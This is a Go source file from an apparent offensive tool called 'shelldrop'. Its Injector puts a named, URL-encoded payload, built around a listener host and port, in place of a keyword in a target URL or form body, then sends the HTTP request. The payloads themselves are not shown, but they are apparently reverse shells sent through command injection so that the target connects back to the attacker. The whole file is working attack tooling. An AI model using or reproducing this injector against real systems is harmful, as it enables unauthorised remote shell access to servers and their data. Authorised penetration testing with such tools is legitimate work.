package main

import (
	"context"
	"io"
	"net/http"
	"shelldrop/log"
	"shelldrop/payloads"
	"strings"
	"time"
)

type (
	Injector struct {
		listenerConfig ListenerConfig
		payloadName    string
		method         string
		url            string
		data           string
	}
)

func NewInjector(payloadName string) *Injector {
	return &Injector{
		payloadName: payloadName,
	}
}

func (i *Injector) Do(ctx context.Context) error {
	log.Infof("Testing %s", i.payloadName)

	url := i.setPayload(i.url)
	var body io.Reader = nil

	if i.hasData() {
		body = strings.NewReader(i.setPayload(i.data))
	}

	req, err := http.NewRequestWithContext(ctx, i.method, url, body)
	if err != nil {
		return err
	}

	if i.hasData() {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	client := &http.Client{
		Timeout: 3 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (i *Injector) WithListenerConfig(listenerConfig ListenerConfig) *Injector {
	i.listenerConfig = listenerConfig
	return i
}

func (i *Injector) WithUrl(url string) *Injector {
	i.url = url
	return i
}

func (i *Injector) WithMethod(method string) *Injector {
	i.method = method
	return i
}

func (i *Injector) WithData(data string) *Injector {
	i.data = data
	return i
}

func (i *Injector) hasData() bool {
	return i.data != ""
}

func (i *Injector) setPayload(value string) string {
	payload := payloads.GetUrlEncoded(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	return strings.Replace(value, ShellDropKeyword, payload, -1)
}
